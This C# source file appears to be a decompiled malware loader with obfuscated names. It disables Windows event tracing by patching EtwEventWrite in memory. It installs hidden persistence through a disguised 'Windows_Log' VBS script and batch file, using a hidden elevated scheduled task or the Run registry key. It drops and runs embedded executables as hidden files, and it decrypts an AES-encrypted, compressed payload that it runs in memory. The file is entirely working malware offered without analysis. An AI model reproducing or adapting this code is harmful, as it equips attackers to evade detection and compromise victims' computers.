using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace rUWoihOEojiFGfnTXSni;

internal class JnsLfZyMONPsyfguAdXP
{
	private static uint PAGE_EXECUTE_READWRITE = 64u;

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string lpFileName);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	private static void Main(string[] args)
	{
		_ = Process.GetCurrentProcess().MainModule.FileName;
		try
		{
			if (!IsStartup(Console.Title))
			{
				InstallStartup(Console.Title);
			}
		}
		catch
		{
			Process.GetCurrentProcess().Kill();
		}
		IntPtr hModule = LoadLibrary("ntdll.dll");
		IntPtr procAddress = GetProcAddress(hModule, "EtwEventWrite");
		byte[] array = ((IntPtr.Size == 8) ? new byte[1] { 195 } : new byte[3] { 194, 20, 0 });
		VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, PAGE_EXECUTE_READWRITE, out var lpflOldProtect);
		Marshal.Copy(array, 0, procAddress, array.Length);
		VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, lpflOldProtect, out lpflOldProtect);
		string text = "payload.exe";
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		foreach (string name in manifestResourceNames)
		{
			if (name == text || name == "UAC" || (!name.EndsWith(".exe") && !name.EndsWith(".bat")))
			{
				continue;
			}
			try
			{
				File.WriteAllBytes(name, KTtVnvGpJcRqUOghxIGf(name));
				File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
				new Thread(() =>
				{
					Process.Start(name).WaitForExit();
					File.SetAttributes(name, FileAttributes.Normal);
					File.Delete(name);
				}).Start();
			}
			catch
			{
			}
		}
		byte[] rawAssembly = JbQBtQhBYTtUVxZvdrPX(inkaVipEtSzuLiweCkji(KTtVnvGpJcRqUOghxIGf(text), Convert.FromBase64String("j0UWCwHuuH1baABUd2rnzy7W6itixQ1HsLLD5U9Gpyo="), Convert.FromBase64String("0hrr74tZ2P5HjDB/RuZo2g==")));
		string[] array2 = new string[0];
		try
		{
			array2 = args[0].Split(' ');
		}
		catch
		{
		}
		MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
		try
		{
			entryPoint.Invoke(null, new object[1] { array2 });
		}
		catch
		{
			entryPoint.Invoke(null, null);
		}
	}

	private static bool IsAdmin()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static bool IsStartup(string path)
	{
		if (path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
		{
			return true;
		}
		return false;
	}

	private static void InstallStartup(string batPath)
	{
		string text = ".bat";
		string text2 = new Random().Next(1, 1000).ToString();
		string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Log_" + text2 + text;
		string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Log_" + text2 + ".vbs";
		File.WriteAllText(text4, "CreateObject(Replace(\"WScript.Shell\",\"SubChar\",\"\")).Run \"\"\"" + text3 + "\"\"\", 0");
		if (IsAdmin())
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "powershell.exe";
			processStartInfo.Arguments = "Register-ScheduledTask -TaskName 'Windows_Log_" + text2 + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + text4 + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force";
			processStartInfo.UseShellExecute = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo).WaitForExit();
		}
		else
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Windows_Log_" + text2 + "_str", "wscript.exe \"" + text4 + "\"");
			registryKey.Dispose();
		}
		if (batPath.IndexOf(text3, StringComparison.OrdinalIgnoreCase) != 0)
		{
			File.Copy(batPath, text3, overwrite: true);
			Process.Start(text4);
			Environment.Exit(-1);
		}
	}

	private static byte[] inkaVipEtSzuLiweCkji(byte[] input, byte[] key, byte[] iv)
	{
		AesManaged aesManaged = new AesManaged();
		aesManaged.Mode = CipherMode.CBC;
		aesManaged.Padding = PaddingMode.PKCS7;
		ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor(key, iv);
		byte[] result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
		cryptoTransform.Dispose();
		aesManaged.Dispose();
		return result;
	}

	private static byte[] JbQBtQhBYTtUVxZvdrPX(byte[] bytes)
	{
		MemoryStream memoryStream = new MemoryStream(bytes);
		MemoryStream memoryStream2 = new MemoryStream();
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		gZipStream.CopyTo(memoryStream2);
		gZipStream.Dispose();
		memoryStream2.Dispose();
		memoryStream.Dispose();
		return memoryStream2.ToArray();
	}

	private static byte[] KTtVnvGpJcRqUOghxIGf(string name)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		MemoryStream memoryStream = new MemoryStream();
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
		manifestResourceStream.CopyTo(memoryStream);
		manifestResourceStream.Dispose();
		byte[] result = memoryStream.ToArray();
		memoryStream.Dispose();
		return result;
	}
}
